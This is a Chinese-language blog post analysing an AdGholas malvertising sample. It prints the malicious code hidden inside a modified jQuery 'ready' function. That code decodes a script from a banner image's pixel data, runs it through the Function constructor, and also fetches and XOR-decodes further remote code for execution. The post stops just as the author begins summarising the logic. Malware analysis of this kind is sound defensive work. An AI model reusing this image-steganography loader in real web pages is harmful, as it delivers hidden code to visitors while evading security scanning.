---
title: AdGholas样本分析 - 隐藏之深，难以察觉
date: 2017-02-07 09:19:34
tags: 样本分析
---

# 背景介绍

从[Brooks](https://twitter.com/brooks_li)那里拿到AdGholas的sample，第一眼看上去，什么都没看出来，还以为是normal sample呢。后来跟Brooks确认以后，这个sample的确是恶意的，相应的code就隐藏在library中，这才找出更多的线索，把这个sample的来龙去脉梳理清楚。

据悉，这个sample去年6、7月份出来，目前EK中使用的不多，应该也是在尝试阶段。之所以写这篇文章，是因为从这里，可以看到attacker为了躲避检查，做了很多隐藏的手段，而这些方法也都是许多security solution可能忽略的。

# 样本细节分析

样本中的library还是挺多的，为了简单排斥掉不相干的library，去官方网站上找相应的js library，进行对比，会是一种取巧的方法。

最后，定位在一个JQuery的library文件上，但是，beautify以后的libaray高达4K行，也有许多diff的地方，再加上书写的实在是太规整了，难以通过直观的判断，找出哪里是包含恶意的code。

考虑到这样的code应该会有解密过程，那么，用常见的解密函数去搜索一下看看有没有什么发现，像：`eval`, `appendChild`, `fromCharCode`, `charCodeAt`等等，最后，发现了这么一段code，觉得有些异样。

```javascript
ready: function(a) {
    if (!0 === a ? !--d.readyWait : !d.isReady) {
        if (!(n.body && "adt" in q)) return setTimeout(d.ready, 10);
        var b = adt.opts;
        if (!(d.isReady || "it" in q) && 3 < ("" + adt.opts.aid).length) {
            var c = function() {
                    var a = h.offsetWidth,
                        c = h.offsetHeight;
                    f.width = a;
                    f.height = c;
                    f.style.width = a + "px";
                    f.style.height = c + "px";
                    g.drawImage(h, 0, 0);
                    for (var d = g.getImageData(0, 0, a, c).data, a = [], e = d.length, m = -1, c = 3; c < e; c += 4) 255 != d[c] && (a[++m] = (~d[c] & 255) / 2 & 255);
                    d = "";
                    for (c = 0; c < a.length; c++) d += String.fromCharCode(a[c] ^ 22);
                    try {
                        d = d.split(Array(10).join("/"))[0];
                        b.x = a.slice(d.length + 9);
                        try {
                            "constructor".constructor.constructor(d)() // 类似于eval()
                        } catch (p) {}
                    } catch (p) {
                        b.t.fb = 1, b.t.eh = p
                    }
                    return !0
                },
                e = !1,
                f = n.createElement("savnac".split("").reverse().join(""));
            if (f.getContext) {
                var g = f.getContext("2d");
                g.getImageData && (e = !0)
            }
            if (e) {
                var h = n.getElementById("banner").getElementsByTagName("img")[0];
                if (h.complete) c();
                else return setTimeout(d.ready, 50)
            } else b.t.fb = 1;
            b.t.g = n.security ? 1 : 0;
            b.t.c = function() {
                for (var a in q)
                    if ("__" == a.substr(0, 2)) return 1;
                return 0
            }();
            q.it = !0;
            b.cb = function(a, c, e) {
                "object" !== typeof a && (a = e);
                if (!(4 !== a.readyState && "error" != c || "ld" in q || "ld2" in q)) {
                    b.cb = null;
                    q.ld = !0;
                    a = a.status;
                    c = 200 < a && 1E3 > a && 400 !== a;
                    var f = "fb" in adt.ms;
                    200 !== a && (e = d.extend({}, adt.ms), e.df = 1, c && (e.df = a ^ 200), e.q = 1, adt.req(e, function(a, c, d) {
                        "object" !== typeof a && (a = d);
                        if (!(4 !== a.readyState || "ld2" in q) && (q.ld2 = !0, 200 === a.status)) {
                            c = a.responseText;
                            if (a = a.getResponseHeader("xhr-sid")) a = a.split("-"), b.k = a[0], b.u = a[1];
                            if (f && c && 40 < c.length) {
                                a = 238;
                                d = [];
                                for (var e = c.length; a < e; d.push(c.charCodeAt(a) ^ 225), a++);
                                try {
                                    "constructor".constructor.constructor(String.fromCharCode.apply("", d))()
                                } catch (g) {}
                            }
                        }
                    }))
                }
            }
        }
        d.isReady = !0;
        !0 !== a && 0 < --d.readyWait || (pa.resolveWith(n, [d]), d.fn.triggerHandler && (d(n).triggerHandler("ready"), d(n).off("ready")))
    }
}
```

读完这段code以后，大致的逻辑是这样的：
- 









